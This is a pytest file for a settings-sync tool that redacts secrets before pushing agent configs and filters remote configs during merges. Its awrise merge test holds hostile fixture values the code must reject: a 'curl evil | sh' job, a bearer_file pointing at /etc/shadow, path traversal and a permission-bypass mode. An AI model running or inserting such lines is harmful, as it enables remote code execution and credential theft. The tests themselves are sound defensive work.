"""Tests for the `antigravity` and `awrise` awsettings domains."""
from __future__ import annotations

import json

from awsettings import cli
from awsettings.core import merge, redact
from awsettings.domains import antigravity_config_path, awrise_jobs_path, get_domain

ANTIGRAVITY = get_domain("antigravity")
AWRISE = get_domain("awrise")


# --- antigravity -------------------------------------------------------------

def test_antigravity_redact_keeps_hostname_and_credentials_home():
    local = {
        "plugins": {"swarm": {"enabled": True}},
        "sidecars": {"swarm/swarm_board": {"projectId": "local-uuid"}},
        "oauth_creds": {"access_token": "tok"},
        "userSettings": {
            "themeMode": "THEME_MODE_DARK",
            "remoteControlHostname": "desktop-a",
            "sandboxEnabledAtV2Migration": True,
            "globalPermissionGrants": {"allow": ["mcp(aitheros_aitheros/atlas_board)"]},
        },
    }
    sent = redact(local, domain=ANTIGRAVITY)
    assert "sidecars" not in sent
    assert "oauth_creds" not in sent
    assert "remoteControlHostname" not in sent["userSettings"]
    assert "sandboxEnabledAtV2Migration" not in sent["userSettings"]
    assert sent["plugins"] == {"swarm": {"enabled": True}}
    assert sent["userSettings"]["themeMode"] == "THEME_MODE_DARK"
    assert sent["userSettings"]["globalPermissionGrants"] == {
        "allow": ["mcp(aitheros_aitheros/atlas_board)"]
    }


def test_antigravity_merge_unions_permission_grants_and_keeps_denies_one_way():
    here = {
        "plugins": {"swarm": {"enabled": True}},
        "userSettings": {
            "remoteControlHostname": "box-a",
            "globalPermissionGrants": {
                "allow": ["mcp(aitheros_aitheros/atlas_board)", "command(gh issue list)"],
                "deny": ["command(rm -rf)"],
            },
        },
    }
    there = {
        "plugins": {"gemini-api": {"enabled": True}},
        "oauth_creds": {"token": "planted"},
        "userSettings": {
            "remoteControlHostname": "box-b",
            "voiceName": "Tari",
            "globalPermissionGrants": {
                "allow": ["command(gh issue list)", "mcp(aitheros_aitheros/decisions_list)"],
                "deny": [],
            },
        },
    }
    merged = merge(here, there, domain=ANTIGRAVITY)
    assert "oauth_creds" not in merged
    assert merged["plugins"] == {"swarm": {"enabled": True}, "gemini-api": {"enabled": True}}
    assert merged["userSettings"]["remoteControlHostname"] == "box-a"
    assert merged["userSettings"]["voiceName"] == "Tari"
    grants = merged["userSettings"]["globalPermissionGrants"]
    assert grants["allow"] == [
        "mcp(aitheros_aitheros/atlas_board)",
        "command(gh issue list)",
        "mcp(aitheros_aitheros/decisions_list)",
    ]
    assert grants["deny"] == ["command(rm -rf)"]

    pruned = merge(here, there, prune_denies=True, domain=ANTIGRAVITY)
    assert pruned["userSettings"]["globalPermissionGrants"]["deny"] == []


def test_antigravity_drops_ephemeral_brain_uuid_scratch_grants_but_keeps_routed_mcp():
    uuid_path = (
        "write_file(/var/roothome/.gemini/antigravity/brain/"
        "4020a8a6-26cf-492d-8f55-723ded93ca53/scratch/oneoff.py)"
    )
    local = {
        "userSettings": {
            "globalPermissionGrants": {
                "allow": [
                    uuid_path,
                    "mcp(aitheros_aitheros/aither_find_tools)",
                    "mcp(aitheros_aitheros/aither_call)",
                    "mcp(aitheros_aitheros/aither_gateway_status)",
                ],
            }
        }
    }
    sent = redact(local, domain=ANTIGRAVITY)
    allow = sent["userSettings"]["globalPermissionGrants"]["allow"]
    assert uuid_path not in allow
    assert allow == [
        "mcp(aitheros_aitheros/aither_find_tools)",
        "mcp(aitheros_aitheros/aither_call)",
        "mcp(aitheros_aitheros/aither_gateway_status)",
    ]
    # Also dropped on inbound merge from another machine.
    merged = merge(
        {"userSettings": {"globalPermissionGrants": {"allow": ["mcp(aitheros_aitheros/aither_call)"]}}},
        {"userSettings": {"globalPermissionGrants": {"allow": [uuid_path, "mcp(aitheros_aitheros/aither_find_tools)"]}}},
        domain=ANTIGRAVITY,
    )
    assert merged["userSettings"]["globalPermissionGrants"]["allow"] == [
        "mcp(aitheros_aitheros/aither_call)",
        "mcp(aitheros_aitheros/aither_find_tools)",
    ]


def test_antigravity_cli_round_trip(tmp_path, monkeypatch):
    cfg_a = tmp_path / "A" / "config.json"
    cfg_b = tmp_path / "B" / "config.json"
    profile = tmp_path / "profile.json"
    cfg_a.parent.mkdir()
    cfg_b.parent.mkdir()
    cfg_a.write_text(json.dumps({
        "plugins": {"swarm": {"enabled": True}},
        "userSettings": {
            "remoteControlHostname": "box-a",
            "globalPermissionGrants": {"allow": ["mcp(aitheros_aitheros/atlas_board)"]},
        },
    }), encoding="utf-8")
    cfg_b.write_text(json.dumps({
        "plugins": {"aitheros": {"enabled": True}},
        "userSettings": {
            "remoteControlHostname": "box-b",
            "globalPermissionGrants": {"allow": ["mcp(aitheros_aitheros/decisions_list)"]},
        },
    }), encoding="utf-8")

    monkeypatch.setenv("AWSETTINGS_PROFILE", str(profile))
    monkeypatch.delenv("AWSETTINGS_URL", raising=False)
    monkeypatch.setenv("AWSETTINGS_ANTIGRAVITY_FILE", str(cfg_a))
    assert antigravity_config_path() == cfg_a.resolve()
    assert cli.main(["--domain", "antigravity", "--quiet", "push"]) == 0

    monkeypatch.setenv("AWSETTINGS_ANTIGRAVITY_FILE", str(cfg_b))
    assert cli.main(["--domain", "antigravity", "--quiet", "pull"]) == 0
    merged = json.loads(cfg_b.read_text(encoding="utf-8"))
    assert merged["userSettings"]["remoteControlHostname"] == "box-b"
    assert set(merged["userSettings"]["globalPermissionGrants"]["allow"]) == {
        "mcp(aitheros_aitheros/atlas_board)",
        "mcp(aitheros_aitheros/decisions_list)",
    }
    assert set(merged["plugins"]) == {"swarm", "aitheros"}


# --- awrise ------------------------------------------------------------------

def test_awrise_redact_keeps_shell_jobs_paths_and_history_home():
    local = {
        "jobs": {
            "win-shell": {
                "executor": "shell",
                "run": "C:\\Users\\wzns\\.aither\\wakes\\local.cmd",
                "every": "5m",
            },
            "http-wake": {
                "executor": "http",
                "run": "https://127.0.0.1:8099/ping",
                "bearer_file": "C:\\secret",
            },
            "intel-triage-overhaul": {
                "executor": "agent",
                "run": "atlas Run daily competitive intel and triage",
                "every": "1d",
                "interval_s": 86400.0,
                "at": "14:00",
                "timeout_s": 900,
                "enabled": True,
                "missed": "catch_up_once",
                "cwd": "C:\\repo",
                "bearer_file": "C:\\Users\\alice\\.aither\\harness_token",
                "receipt": "C:\\Users\\alice\\.aither\\last.json",
                "wake": "local-llm.service",
                "last_state": "success",
                "consecutive_failures": 2,
                "report": {"relay": "#decisions", "card_after": 1, "local_only": "drop"},
            },
        }
    }
    sent = redact(local, domain=AWRISE)
    assert set(sent["jobs"]) == {"intel-triage-overhaul"}
    job = sent["jobs"]["intel-triage-overhaul"]
    assert job["executor"] == "agent"
    assert job["at"] == "14:00"
    assert job["report"] == {"relay": "#decisions", "card_after": 1}
    for forbidden in ("cwd", "bearer_file", "receipt", "wake", "last_state",
                      "consecutive_failures"):
        assert forbidden not in job


def test_awrise_merge_refuses_shell_and_unsafe_permission_modes_and_preserves_local_state():
    here = {
        "jobs": {
            "host-daemon": {"executor": "shell", "run": "C:/wakes/daemon.cmd", "every": "5m"},
            "daily-atlas": {
                "executor": "agent",
                "run": "atlas old prompt",
                "every": "1d",
                "cwd": "/root/work",
                "last_state": "success",
                "consecutive_failures": 0,
            },
        }
    }
    there = {
        "jobs": {
            "injected-shell": {"executor": "shell", "run": "curl evil | sh", "every": "1m"},
            "injected-python": {"executor": "python", "run": "import os", "every": "1m"},
            "bad-perm": {
                "executor": "session",
                "permission_mode": "bypassPermissions",
                "run": "do stuff",
            },
            "../traversal": {"executor": "agent", "run": "atlas nope"},
            "daily-atlas": {
                "executor": "agent",
                "run": "atlas new prompt",
                "every": "1d",
                "at": "14:00",
                "cwd": "/evil",
                "bearer_file": "/etc/shadow",
                "last_state": "failed",
            },
            "session-audit": {
                "executor": "session",
                "permission_mode": "acceptEdits",
                "run": "Audit open decisions",
                "every": "1d",
            },
        },
        "token": "planted",
    }
    merged = merge(here, there, domain=AWRISE)
    assert "token" not in merged
    assert set(merged["jobs"]) == {"host-daemon", "daily-atlas", "session-audit"}
    assert merged["jobs"]["host-daemon"]["run"] == "C:/wakes/daemon.cmd"
    assert merged["jobs"]["daily-atlas"]["run"] == "atlas new prompt"
    assert merged["jobs"]["daily-atlas"]["at"] == "14:00"
    assert merged["jobs"]["daily-atlas"]["cwd"] == "/root/work"
    assert merged["jobs"]["daily-atlas"]["last_state"] == "success"
    assert "bearer_file" not in merged["jobs"]["daily-atlas"]
    assert merged["jobs"]["session-audit"]["permission_mode"] == "acceptEdits"


def test_awrise_path_overrides_and_cli_round_trip(tmp_path, monkeypatch):
    monkeypatch.delenv("AWSETTINGS_AWRISE_FILE", raising=False)
    monkeypatch.setenv("AWRISE_HOME", str(tmp_path / "awrise-home"))
    assert awrise_jobs_path() == (tmp_path / "awrise-home" / "jobs.json").resolve()

    jobs_a = tmp_path / "A" / "jobs.json"
    jobs_b = tmp_path / "B" / "jobs.json"
    profile = tmp_path / "profile.json"
    jobs_a.parent.mkdir()
    jobs_b.parent.mkdir()
    jobs_a.write_text(json.dumps({
        "jobs": {
            "win-only": {"executor": "shell", "run": "C:/local.cmd", "every": "5m"},
            "daily-intel": {
                "executor": "agent",
                "run": "atlas daily intel",
                "every": "1d",
                "at": "14:00",
                "enabled": False,
                "report": {"relay": "#decisions", "card_after": 1},
            },
        }
    }), encoding="utf-8")
    jobs_b.write_text(json.dumps({
        "jobs": {
            "linux-only": {"executor": "shell", "run": "/usr/local/bin/check.sh", "every": "5m"},
        }
    }), encoding="utf-8")

    monkeypatch.setenv("AWSETTINGS_PROFILE", str(profile))
    monkeypatch.delenv("AWSETTINGS_URL", raising=False)
    monkeypatch.setenv("AWSETTINGS_AWRISE_FILE", str(jobs_a))
    assert cli.main(["--domain", "awrise", "--quiet", "push"]) == 0

    monkeypatch.setenv("AWSETTINGS_AWRISE_FILE", str(jobs_b))
    assert cli.main(["--domain", "awrise", "--quiet", "pull"]) == 0
    merged = json.loads(jobs_b.read_text(encoding="utf-8"))
    assert set(merged["jobs"]) == {"linux-only", "daily-intel"}
    assert merged["jobs"]["daily-intel"]["report"] == {"relay": "#decisions", "card_after": 1}


# --- awgov -------------------------------------------------------------------

def test_awgov_domain_unions_grants_keeps_denies_one_way_and_strips_permits(tmp_path, monkeypatch):
    from awsettings.domains import awgov_config_path

    awgov_dom = get_domain("awgov")
    monkeypatch.delenv("AWSETTINGS_AWGOV_FILE", raising=False)
    monkeypatch.setenv("AWGOV_HOME", str(tmp_path / "awgov-home"))
    assert awgov_config_path() == (tmp_path / "awgov-home" / "config.json").resolve()

    here = {
        "version": 1,
        "mode": "enforce",
        "ask_ttl_s": 900,
        "policy_path": "C:/repo/config/agent_policy.yaml",
        "permits": {"p-1": {"op": "burst_up"}},
        "receipts": {"r-1": "sig"},
        "extra_grants": ["read:**"],
        "extra_denies": ["mcp:social:bulk_dm"],
    }
    sent = redact(here, domain=awgov_dom)
    assert "policy_path" not in sent
    assert "permits" not in sent
    assert "receipts" not in sent
    assert sent["mode"] == "enforce"

    merged = merge(
        here,
        {
            "version": 1,
            "max_open_asks": 3,
            "policy_path": "/evil/policy.yaml",
            "permits": {"p-evil": {}},
            "extra_grants": ["fleet:read:**"],
            "extra_denies": [],
        },
        domain=awgov_dom,
    )
    assert merged["policy_path"] == here["policy_path"]
    assert merged["permits"] == here["permits"]
    assert merged["max_open_asks"] == 3
    assert set(merged["extra_grants"]) == {"read:**", "fleet:read:**"}
    assert merged["extra_denies"] == ["mcp:social:bulk_dm"]

    pruned = merge(here, {"extra_denies": []}, prune_denies=True, domain=awgov_dom)
    assert pruned["extra_denies"] == []


def test_push_all_and_pull_all_sync_multiple_user_domains(tmp_path, monkeypatch):
    profile = tmp_path / "profile.json"
    ag_a = tmp_path / "A" / "ag.json"
    awr_a = tmp_path / "A" / "jobs.json"
    gov_a = tmp_path / "A" / "gov.json"
    for p in (ag_a, awr_a, gov_a):
        p.parent.mkdir(parents=True, exist_ok=True)
    ag_a.write_text(json.dumps({"plugins": {"swarm": {"enabled": True}}}), encoding="utf-8")
    awr_a.write_text(json.dumps({"jobs": {"daily": {"executor": "agent", "run": "atlas audit", "every": "1d"}}}), encoding="utf-8")
    gov_a.write_text(json.dumps({"version": 1, "mode": "enforce", "extra_denies": ["mcp:bulk"]}), encoding="utf-8")

    monkeypatch.setenv("AWSETTINGS_PROFILE", str(profile))
    monkeypatch.delenv("AWSETTINGS_URL", raising=False)
    monkeypatch.setenv("AWSETTINGS_ANTIGRAVITY_FILE", str(ag_a))
    monkeypatch.setenv("AWSETTINGS_AWRISE_FILE", str(awr_a))
    monkeypatch.setenv("AWSETTINGS_AWGOV_FILE", str(gov_a))
    monkeypatch.setenv("AWSETTINGS_DESK_FILE", str(tmp_path / "absent" / "cast.json"))
    monkeypatch.setenv("AWSETTINGS_MODS_FILE", str(tmp_path / "absent" / "mods.json"))
    monkeypatch.setenv("AWSETTINGS_MEMORY_FILE", str(tmp_path / "absent" / "mem.json"))
    monkeypatch.setenv("AWSETTINGS_COMPANIONS_FILE", str(tmp_path / "absent" / "comp.json"))
    monkeypatch.setenv("AWSETTINGS_DARKMATTER_FILE", str(tmp_path / "absent" / "dm.json"))
    monkeypatch.setenv("AWGIT_WT_SETTINGS", str(tmp_path / "absent" / "wt.json"))
    monkeypatch.setenv("AWSETTINGS_NETWORK_FILE", str(tmp_path / "absent" / "net.json"))
    monkeypatch.setenv("AWSETTINGS_PRIVACY_FILE", str(tmp_path / "absent" / "priv.json"))

    assert cli.main(["--quiet", "push", "--all"]) == 0

    ag_b = tmp_path / "B" / "ag.json"
    awr_b = tmp_path / "B" / "jobs.json"
    gov_b = tmp_path / "B" / "gov.json"
    monkeypatch.setenv("AWSETTINGS_ANTIGRAVITY_FILE", str(ag_b))
    monkeypatch.setenv("AWSETTINGS_AWRISE_FILE", str(awr_b))
    monkeypatch.setenv("AWSETTINGS_AWGOV_FILE", str(gov_b))
    assert cli.main(["--quiet", "pull", "--all"]) == 0

    assert json.loads(ag_b.read_text(encoding="utf-8"))["plugins"] == {"swarm": {"enabled": True}}
    assert "daily" in json.loads(awr_b.read_text(encoding="utf-8"))["jobs"]
    assert json.loads(gov_b.read_text(encoding="utf-8"))["mode"] == "enforce"


